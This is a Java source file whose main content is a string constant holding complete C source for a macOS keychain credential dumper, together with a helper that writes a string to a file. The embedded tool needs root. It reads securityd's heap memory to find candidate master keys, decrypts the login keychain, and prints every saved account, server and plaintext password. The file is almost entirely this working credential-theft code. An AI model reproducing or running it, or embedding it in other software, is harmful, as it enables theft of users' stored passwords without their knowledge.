package security;

import java.io.FileNotFoundException;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;

public class read {
	public static boolean success;
	public static void WriteFile(String file,String body){
		String[] lines=body.split("\n");
		PrintWriter writer;
		try {
			writer = new PrintWriter(file, "UTF-8");
			 for(int i=0; i<lines.length; i++){
				 writer.println(lines[i]);
				 
			 }
			writer.close();
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (UnsupportedEncodingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
		
		
		
	
	
	public static  String code ="#include <stdio.h>\n" +
			 "#include <stdlib.h>\n" +
			 "#include <string.h>\n" +
			 "#include <mach/mach.h>\n" +
			 "#include <mach/vm_map.h>\n" +
			 "#include <openssl/des.h>\n" +
			 "#include <sys/sysctl.h>\n" +
			 "\n" +
			 "// This structure's fields are pieced together from several sources,\n" +
			 "// using the label as an identifier. See find_or_create_credentials.\n" +
			 "typedef struct t_credentials {\n" +
			 "    char label[20];\n" +
			 "    char iv[8];\n" +
			 "    char key[24];\n" +
			 "    size_t ciphertext_len;\n" +
			 "    char *ciphertext;\n" +
			 "    char *server;\n" +
			 "    char *account;\n" +
			 "    char *password;\n" +
			 "} t_credentials;\n" +
			 "\n" +
			 "// Lazy limits to avoid reallocing / having to code fancy data storage.\n" +
			 "#define MAX_CREDENTIALS 2048\n" +
			 "#define MAX_MASTER_CANDIDATES 1024\n" +
			 "\n" +
			 "t_credentials *g_credentials = 0;\n" +
			 "int g_credentials_count = 0;\n" +
			 "char **g_master_candidates = 0;\n" +
			 "int g_master_candidates_count = 0;\n" +
			 "\n" +
			 "// Writes a hex representation of the bytes in src to the dst buffer.\n" +
			 "// The dst buffer must be at least len*2+1 bytes in size.\n" +
			 "void hex_string(char *dst, char *src, size_t len) {\n" +
			 "    int i;\n" +
			 "    for (i = 0; i < len; ++i) {\n" +
			 "        sprintf(dst+i*2, \"%02x\", (unsigned char)src[i]);\n" +
			 "    }\n" +
			 "}\n" +
			 "\n" +
			 "// Saves a 24-byte sequence that might be a valid master key in the\n" +
			 "// global list. Checks the existing list first to avoid duplicates.\n" +
			 "void add_master_candidate(char *key) {\n" +
			 "    if (!g_master_candidates) {\n" +
			 "        g_master_candidates = malloc(MAX_MASTER_CANDIDATES * sizeof(char *));\n" +
			 "    }\n" +
			 "\n" +
			 "    // Key already known?\n" +
			 "    int i;\n" +
			 "    for (i = 0; i < g_master_candidates_count; ++i) {\n" +
			 "        if (!memcmp(key, g_master_candidates[i], 24)) return;\n" +
			 "    }\n" +
			 "\n" +
			 "    if (g_master_candidates_count < MAX_MASTER_CANDIDATES) {\n" +
			 "        char *new = malloc(24);\n" +
			 "        memcpy(new, key, 24);\n" +
			 "        g_master_candidates[g_master_candidates_count++] = new;\n" +
			 "    } else {\n" +
			 "        printf(\"[-] Too many candidate keys to fit in memory\\n\");\n" +
			 "        exit(1);\n" +
			 "    }\n" +
			 "}\n" +
			 "\n" +
			 "// Enumerates the system's process list to find the PID of securityd.\n" +
			 "int get_securityd_pid() {\n" +
			 "    int mib[] = {CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0};\n" +
			 "\n" +
			 "    size_t sz;\n" +
			 "    sysctl(mib, 4, NULL, &sz, NULL, 0);\n" +
			 "\n" +
			 "    struct kinfo_proc *procs = malloc(sz);\n" +
			 "    sysctl(mib, 4, procs, &sz, NULL, 0);\n" +
			 "\n" +
			 "    int proc_count = sz / sizeof(struct kinfo_proc);\n" +
			 "    int i, pid = 0;\n" +
			 "    for (i = 0; i < proc_count; ++i) {\n" +
			 "        struct kinfo_proc *proc = &procs[i];\n" +
			 "        if (!strcmp(\"securityd\", proc->kp_proc.p_comm)) {\n" +
			 "            pid = proc->kp_proc.p_pid;\n" +
			 "            break;\n" +
			 "        }\n" +
			 "    }\n" +
			 "\n" +
			 "    free(procs);\n" +
			 "    return pid;\n" +
			 "}\n" +
			 "\n" +
			 "// Searches a memory range for anything that looks like a master encryption key\n" +
			 "// and stores each found candidate in the global list of possible master keys.\n" +
			 "void search_for_keys_in_task_memory(mach_port_name_t task, vm_address_t start, vm_address_t stop) {\n" +
			 "    size_t sz = stop - start;\n" +
			 "    char *buffer = malloc(sz);\n" +
			 "    if (!buffer) {\n" +
			 "        printf(\"[-] Could not allocate memory for key search\\n\");\n" +
			 "        exit(1);\n" +
			 "    }\n" +
			 "\n" +
			 "    size_t read_sz;\n" +
			 "\n" +
			 "    kern_return_t r = vm_read_overwrite(task, start, sz, (vm_address_t)buffer, &read_sz);\n" +
			 "    if (sz != read_sz) printf(\"[-] Requested %lu bytes, got %lu bytes\\n\", sz, read_sz);\n" +
			 "\n" +
			 "    if (r == KERN_SUCCESS) {\n" +
			 "        int i;\n" +
			 "        for (i = 0; i < read_sz - sizeof(unsigned long int); i += 4) {\n" +
			 "            unsigned long int *p = (unsigned long int *)(buffer + i);\n" +
			 "\n" +
			 "            // Look for an 8-byte size field with value 0x18, followed by an 8-byte\n" +
			 "            // pointer to the same memory range we are currently inspecting. Use\n" +
			 "            // the value the pointer points to as a candidate master key.\n" +
			 "            if (*p == 0x18) {\n" +
			 "                vm_address_t address = *(p + 1);\n" +
			 "                if (address >= start && address <= stop) {\n" +
			 "                    char key[24 + 1];\n" +
			 "                    key[24] = 0;\n" +
			 "                    memcpy(key, buffer + address - start, 24);\n" +
			 "                    add_master_candidate(key);\n" +
			 "                }\n" +
			 "            }\n" +
			 "        }\n" +
			 "    } else {\n" +
			 "        printf(\"[-] Error (%i) reading task memory @ %p\\n\", r, (void *)start);\n" +
			 "    }\n" +
			 "\n" +
			 "    free(buffer);\n" +
			 "}\n" +
			 "\n" +
			 "// Uses vmmap to enumerate memory ranges where the keys might be hidden\n" +
			 "// and then searches each range individually for candidate master keys.\n" +
			 "void search_for_keys_in_process(int pid) {\n" +
			 "    mach_port_name_t task;\n" +
			 "    task_for_pid(current_task(), pid, &task);\n" +
			 "\n" +
			 "    char cmd[128];\n" +
			 "    snprintf(cmd, 128, \"vmmap %i\", pid);\n" +
			 "\n" +
			 "    FILE *p = popen(cmd, \"r\");\n" +
			 "\n" +
			 "    char line[512];\n" +
			 "    vm_address_t start, stop;\n" +
			 "    while (fgets(line, 512, p)) {\n" +
			 "        if(sscanf(line, \"MALLOC_TINY %lx-%lx\", &start, &stop) == 2) {\n" +
			 "            printf(\"[*] Searching process %i heap range 0x%lx-0x%lx\\n\", pid, start, stop);\n" +
			 "            search_for_keys_in_task_memory(task, start, stop);\n" +
			 "        }\n" +
			 "    }\n" +
			 "\n" +
			 "    pclose(p);\n" +
			 "}\n" +
			 "\n" +
			 "// Returns an Apple Database formatted 32-bit integer from the given address.\n" +
			 "int atom32(char *p) {\n" +
			 "    return ntohl(*(int *)p);\n" +
			 "}\n" +
			 "\n" +
			 "// Returns (creates, if necessary) a credentials struct for the given label.\n" +
			 "t_credentials *find_or_create_credentials(char *label) {\n" +
			 "    if (!g_credentials) {\n" +
			 "        size_t sz = MAX_CREDENTIALS * sizeof(t_credentials);\n" +
			 "        g_credentials = malloc(sz);\n" +
			 "        memset(g_credentials, 0, sz);\n" +
			 "    }\n" +
			 "\n" +
			 "    int i;\n" +
			 "    for (i = 0; i < g_credentials_count; ++i) {\n" +
			 "        if (!memcmp(label, g_credentials[i].label, 20)) {\n" +
			 "            return &g_credentials[i];\n" +
			 "        }\n" +
			 "    }\n" +
			 "\n" +
			 "    if (g_credentials_count < MAX_CREDENTIALS) {\n" +
			 "        t_credentials *new = &g_credentials[g_credentials_count++];\n" +
			 "        memcpy(new->label, label, 20);\n" +
			 "        return new;\n" +
			 "    } else {\n" +
			 "        printf(\"[-] Too many credentials to fit in memory\\n\");\n" +
			 "        exit(1);\n" +
			 "    }\n" +
			 "}\n" +
			 "\n" +
			 "// Returns 0 for invalid padding, otherwise [1, 8].\n" +
			 "size_t check_3des_plaintext_padding(char *plaintext, size_t len) {\n" +
			 "    char pad = plaintext[len-1];\n" +
			 "    if (pad < 1 || pad > 8) return 0;\n" +
			 "\n" +
			 "    int i;\n" +
			 "    for (i = 1; i < pad; ++i) {\n" +
			 "        if (plaintext[len-1-i] != pad) return 0;\n" +
			 "    }\n" +
			 "\n" +
			 "    return (size_t)pad;\n" +
			 "}\n" +
			 "\n" +
			 "// Returns 0 for invalid data, otherwise length of unpadded plaintext.\n" +
			 "// The unpadded plaintext (if valid) is written to the \"out\" buffer.\n" +
			 "size_t decrypt_3des(char *in, size_t len, char *out, char *key, char* iv) {\n" +
			 "    DES_cblock ckey1, ckey2, ckey3, civ;\n" +
			 "    DES_key_schedule ks1, ks2, ks3;\n" +
			 "\n" +
			 "    memcpy(civ, iv, 8);\n" +
			 "    memcpy(ckey1, &key[0], 8);\n" +
			 "    memcpy(ckey2, &key[8], 8);\n" +
			 "    memcpy(ckey3, &key[16], 8);\n" +
			 "    DES_set_key((C_Block *)ckey1, &ks1);\n" +
			 "    DES_set_key((C_Block *)ckey2, &ks2);\n" +
			 "    DES_set_key((C_Block *)ckey3, &ks3);\n" +
			 "\n" +
			 "    char *padded = malloc(len);\n" +
			 "    DES_ede3_cbc_encrypt((unsigned char *)in, (unsigned char *)padded, len, &ks1, &ks2, &ks3, &civ, DES_DECRYPT);\n" +
			 "\n" +
			 "    size_t out_len = 0;\n" +
			 "    size_t padding = check_3des_plaintext_padding(padded, len);\n" +
			 "    if (padding > 0) {\n" +
			 "        out_len = len - padding;\n" +
			 "        memcpy(out, padded, out_len);\n" +
			 "    }\n" +
			 "    free(padded);\n" +
			 "    return out_len;\n" +
			 "}\n" +
			 "\n" +
			 "// Attempts to decrypt the file's wrapping key with the given master key.\n" +
			 "// Returns 0 if unsuccessful, 24 otherwise. The decrypted key is written\n" +
			 "// to the \"out\" buffer, if valid. May produce false positives, as the\n" +
			 "// 3DES padding is not a 100% reliable way to check validity.\n" +
			 "int dump_wrapping_key(char *out, char *master, char *buffer, size_t sz) {\n" +
			 "    char magic[] = \"\\xfa\\xde\\x07\\x11\";\n" +
			 "    int offset;\n" +
			 "\n" +
			 "    // Instead of parsing the keychain file, just look for the last\n" +
			 "    // blob identified by the magic number and assume it is a DbBlob\n" +
			 "    for (offset = sz-4; offset >= 0; offset -= 4) {\n" +
			 "        if (!strncmp(magic, buffer + offset, 4)) break;\n" +
			 "    }\n" +
			 "    if (offset == 0) {\n" +
			 "        printf(\"[-] Could not find DbBlob\\n\");\n" +
			 "        exit(1);\n" +
			 "    }\n" +
			 "    char *blob = buffer + offset;\n" +
			 "\n" +
			 "    char iv[8];\n" +
			 "    memcpy(iv, blob + 64, 8);\n" +
			 "\n" +
			 "    char key[48];\n" +
			 "    int ciphertext_offset = atom32(blob + 8);\n" +
			 "    size_t key_len = decrypt_3des(blob + ciphertext_offset, 48, key, master, iv);\n" +
			 "\n" +
			 "    if (!key_len) return 0;\n" +
			 "\n" +
			 "    memcpy(out, key, 24);\n" +
			 "    return 24;\n" +
			 "}\n" +
			 "\n" +
			 "// Decrypts the password encryption key from an individual KeyBlob into\n" +
			 "// the global credentials list.\n" +
			 "void dump_key_blob(char *key, char *blob) {\n" +
			 "    int ciphertext_offset = atom32(blob + 8);\n" +
			 "    int blob_len = atom32(blob + 12);\n" +
			 "    char iv[8];\n" +
			 "    memcpy(iv, blob + 16, 8);\n" +
			 "\n" +
			 "    // The label is actually an attribute after the KeyBlob\n" +
			 "    char label[20];\n" +
			 "    memcpy(label, blob + blob_len + 8, 20);\n" +
			 "\n" +
			 "    if (strncmp(label, \"ssgp\", 4)) return;\n" +
			 "\n" +
			 "    int ciphertext_len = blob_len - ciphertext_offset;\n" +
			 "\n" +
			 "    if (ciphertext_len != 48) return;\n" +
			 "\n" +
			 "    // Decrypt the obfuscation IV layer\n" +
			 "    char tmp[48];\n" +
			 "    char obfuscationIv[] = \"\\x4a\\xdd\\xa2\\x2c\\x79\\xe8\\x21\\x05\";\n" +
			 "    size_t tmp_len = decrypt_3des(blob + ciphertext_offset, 48, tmp, key, obfuscationIv);\n" +
			 "\n" +
			 "    // Reverse the fist 32 bytes\n" +
			 "    int i;\n" +
			 "    char reverse[32];\n" +
			 "    for (i = 0; i < 32; ++i) {\n" +
			 "        reverse[31 - i] = tmp[i];\n" +
			 "    }\n" +
			 "\n" +
			 "    // Decrypt the real IV layer\n" +
			 "    tmp_len = decrypt_3des(reverse, 32, tmp, key, iv);\n" +
			 "    if (tmp_len != 28) return;\n" +
			 "\n" +
			 "    // Discard the first 4 bytes\n" +
			 "    t_credentials *cred = find_or_create_credentials(label);\n" +
			 "    memcpy(cred->key, tmp + 4, 24);\n" +
			 "}\n" +
			 "\n" +
			 "// Extracts the encrypted password and the srvr & acct attributes from\n" +
			 "// the (probably table 8) record into the global credentials list.\n" +
			 "void dump_credentials_data(char *record) {\n" +
			 "    int record_sz = atom32(record + 0);\n" +
			 "    int data_sz = atom32(record + 16);\n" +
			 "\n" +
			 "    // No attributes?\n" +
			 "    if (record_sz == 24 + data_sz) return;\n" +
			 "\n" +
			 "    int first_attribute_offset = atom32(record + 24) & 0xfffffffe;\n" +
			 "    int data_offset = first_attribute_offset - data_sz;\n" +
			 "    int attribute_count = (data_offset - 24) / 4;\n" +
			 "\n" +
			 "    // The correct table (8) has 20 attributes\n" +
			 "    if (attribute_count != 20) return;\n" +
			 "\n" +
			 "    char *data = record + data_offset;\n" +
			 "\n" +
			 "    size_t ciphertext_len = data_sz - 20 - 8;\n" +
			 "    if (ciphertext_len < 8) return;\n" +
			 "    if (ciphertext_len % 8 != 0) return;\n" +
			 "\n" +
			 "    char label[20];\n" +
			 "    char iv[8];\n" +
			 "    char *ciphertext = malloc(ciphertext_len);\n" +
			 "\n" +
			 "    memcpy(label, data + 0, 20);\n" +
			 "    memcpy(iv, data + 20, 8);\n" +
			 "    memcpy(ciphertext, data + 28, ciphertext_len);\n" +
			 "\n" +
			 "    t_credentials *cred = find_or_create_credentials(label);\n" +
			 "    memcpy(cred->iv, iv, 8);\n" +
			 "    cred->ciphertext = ciphertext;\n" +
			 "    cred->ciphertext_len = ciphertext_len;\n" +
			 "\n" +
			 "    // Attributes 13 and 15\n" +
			 "    int srvr_attribute_offset = atom32(record + 24 + 15*4) & 0xfffffffe;\n" +
			 "    int acct_attribute_offset = atom32(record + 24 + 13*4) & 0xfffffffe;\n" +
			 "    char *srvr_attribute = record + srvr_attribute_offset;\n" +
			 "    char *acct_attribute = record + acct_attribute_offset;\n" +
			 "    int srvr_len = atom32(srvr_attribute + 0);\n" +
			 "    int acct_len = atom32(acct_attribute + 0);\n" +
			 "\n" +
			 "    if (!srvr_len || !acct_len) return;\n" +
			 "\n" +
			 "    char *srvr = malloc(srvr_len + 1);\n" +
			 "    char *acct = malloc(acct_len + 1);\n" +
			 "    memset(srvr, 0, srvr_len + 1);\n" +
			 "    memset(acct, 0, acct_len + 1);\n" +
			 "    memcpy(srvr, srvr_attribute + 4, srvr_len);\n" +
			 "    memcpy(acct, acct_attribute + 4, acct_len);\n" +
			 "\n" +
			 "    cred->server = srvr;\n" +
			 "    cred->account = acct;\n" +
			 "}\n" +
			 "\n" +
			 "// Parses the keychain file (Apple Database) and traverses each record\n" +
			 "// in each table, looking for two kinds of records: KeyBlobs and\n" +
			 "// credentials data. The KeyBlobs contain encryption keys for each\n" +
			 "// individual password ciphertext. The credentials data records contain\n" +
			 "// the password ciphertexts and their IVs, as well as  account and\n" +
			 "// server attributes. The KeyBlobs are probably in table 6, and the\n" +
			 "// credentials data records in table 8.\n" +
			 "void dump_keychain(char *key, char *buffer) {\n" +
			 "    int i, j;\n" +
			 "\n" +
			 "    if (strncmp(buffer, \"kych\", 4)) {\n" +
			 "        printf(\"[-] The target file is not a keychain file\\n\");\n" +
			 "        return;\n" +
			 "    }\n" +
			 "\n" +
			 "    int schema_offset = atom32(buffer + 12);\n" +
			 "    char *schema = buffer + schema_offset;\n" +
			 "\n" +
			 "    // Traverse each table\n" +
			 "    int table_count = atom32(schema + 4);\n" +
			 "    for (i = 0; i < table_count; ++i) {\n" +
			 "        int table_offset = atom32(schema + 8 + i*4);\n" +
			 "        char *table = schema + table_offset;\n" +
			 "\n" +
			 "        // Traverse each record\n" +
			 "        int record_count = atom32(table + 8);\n" +
			 "        for (j = 0; j < record_count; ++j) {\n" +
			 "            int record_offset = atom32(table + 28 + j*4);\n" +
			 "            char *record = table + record_offset;\n" +
			 "\n" +
			 "            // Calculate the start of the data section\n" +
			 "            int record_sz = atom32(record + 0);\n" +
			 "            int data_sz = atom32(record + 16);\n" +
			 "            int data_offset = 24;\n" +
			 "            if (record_sz > 24 + data_sz) {\n" +
			 "                int first_attribute_offset = atom32(record + 24) & 0xfffffffe;\n" +
			 "                data_offset = first_attribute_offset - data_sz;\n" +
			 "            }\n" +
			 "            char *data = record + data_offset;\n" +
			 "\n" +
			 "            int magic = atom32(data + 0);\n" +
			 "\n" +
			 "            if (magic == 0xfade0711) {\n" +
			 "                dump_key_blob(key, data);\n" +
			 "            } else if (magic == 0x73736770) {\n" +
			 "                dump_credentials_data(record);\n" +
			 "            }\n" +
			 "        }\n" +
			 "    }\n" +
			 "}\n" +
			 "\n" +
			 "// Uses the information in the global credentials list to decrypt the\n" +
			 "// password ciphertexts. Each set of credentials requires its own IV,\n" +
			 "// key, and ciphertext for the decryption to work.\n" +
			 "void decrypt_credentials() {\n" +
			 "    if (!g_credentials) return;\n" +
			 "\n" +
			 "    int i;\n" +
			 "    for (i = 0; i < g_credentials_count; ++i) {\n" +
			 "        t_credentials *cred = &g_credentials[i];\n" +
			 "        if (!cred->ciphertext) continue;\n" +
			 "\n" +
			 "        char *tmp = malloc(cred->ciphertext_len);\n" +
			 "        size_t tmp_len = decrypt_3des(cred->ciphertext, cred->ciphertext_len, tmp, cred->key, cred->iv);\n" +
			 "        if (tmp_len) {\n" +
			 "            cred->password = malloc(tmp_len + 1);\n" +
			 "            cred->password[tmp_len] = 0;\n" +
			 "            memcpy(cred->password, tmp, tmp_len);\n" +
			 "        }\n" +
			 "        free(tmp);\n" +
			 "    }\n" +
			 "}\n" +
			 "\n" +
			 "// Outputs all credentials in \"account:server:password\" format. Call\n" +
			 "// after all the data has been dumped and the passwords decrypted.\n" +
			 "void print_credentials() {\n" +
			 "    if (!g_credentials) return;\n" +
			 "\n" +
			 "    int i;\n" +
			 "    for (i = 0; i < g_credentials_count; ++i) {\n" +
			 "        t_credentials *cred = &g_credentials[i];\n" +
			 "        if (!cred->account && !cred->server) continue;\n" +
			 "        if (!strcmp(cred->account, \"Passwords not saved\")) continue;\n" +
			 "        printf(\"%s:%s:%s\\n\", cred->account, cred->server, cred->password);\n" +
			 "    }\n" +
			 "}\n" +
			 "\n" +
			 "int main(int argc, char **argv) {\n" +
			 "    // Phase 1. Search securityd's memory space for possible master keys.\n" +
			 "    // If the keychain file is unlocked, the real key should be in memory.\n" +
			 "    int pid = get_securityd_pid();\n" +
			 "    if (!pid) {\n" +
			 "        printf(\"[-] Could not find the securityd process\\n\");\n" +
			 "        exit(1);\n" +
			 "    }\n" +
			 "\n" +
			 "    if (geteuid()) {\n" +
			 "        printf(\"[-] No root privileges, please run with sudo\\n\");\n" +
			 "        exit(1);\n" +
			 "    }\n" +
			 "\n" +
			 "    search_for_keys_in_process(pid);\n" +
			 "\n" +
			 "    printf(\"[*] Found %i master key candidates\\n\", g_master_candidates_count);\n" +
			 "\n" +
			 "    if (!g_master_candidates_count) exit(1);\n" +
			 "\n" +
			 "    // Phase 2. Try decrypting the wrapping key with each master key candidate\n" +
			 "    // to see which one gives a valid result.\n" +
			 "    char filename[512];\n" +
			 "    if (argc < 2) {\n" +
			 "        sprintf(filename, \"%s/Library/Keychains/login.keychain\", getenv(\"HOME\"));\n" +
			 "    } else {\n" +
			 "        sprintf(filename, \"%s\", argv[1]);\n" +
			 "    }\n" +
			 "\n" +
			 "    FILE *f = fopen(filename, \"rb\");\n" +
			 "    if (!f) {\n" +
			 "        printf(\"[-] Could not open %s\\n\", filename);\n" +
			 "        exit(1);\n" +
			 "    }\n" +
			 "\n" +
			 "    fseek(f, 0, SEEK_END);\n" +
			 "    size_t sz = ftell(f);\n" +
			 "    char *buffer = malloc(sz);\n" +
			 "    rewind(f);\n" +
			 "    fread(buffer, 1, sz, f);\n" +
			 "    fclose(f);\n" +
			 "\n" +
			 "    printf(\"[*] Trying to decrypt wrapping key in %s\\n\", filename);\n" +
			 "\n" +
			 "    char key[24];\n" +
			 "    int i, key_len = 0;\n" +
			 "    for (i = 0; i < g_master_candidates_count; ++i) {\n" +
			 "        char s_key[24*2+1];\n" +
			 "        hex_string(s_key, g_master_candidates[i], 24);\n" +
			 "        printf(\"[*] Trying master key candidate: %s\\n\", s_key);\n" +
			 "        if (key_len = dump_wrapping_key(key, g_master_candidates[i], buffer, sz)) {\n" +
			 "            printf(\"[+] Found master key: %s\\n\", s_key);\n" +
			 "            break;\n" +
			 "        }\n" +
			 "    }\n" +
			 "    if (!key_len) {\n" +
			 "        printf(\"[-] None of the master key candidates seemed to work\\n\");\n" +
			 "        exit(1);\n" +
			 "    }\n" +
			 "\n" +
			 "    char s_key[24*2+1];\n" +
			 "    hex_string(s_key, key, 24);\n" +
			 "    printf(\"[+] Found wrapping key: %s\\n\", s_key);\n" +
			 "\n" +
			 "    // Phase 3. Using the wrapping key, dump all credentials from the keychain\n" +
			 "    // file into the global credentials list and decrypt everything.\n" +
			 "    dump_keychain(key, buffer);\n" +
			 "    decrypt_credentials();\n" +
			 "    print_credentials();\n" +
			 "\n" +
			 "    free(buffer);\n" +
			 "    return 0;\n" +
			 "}";
}
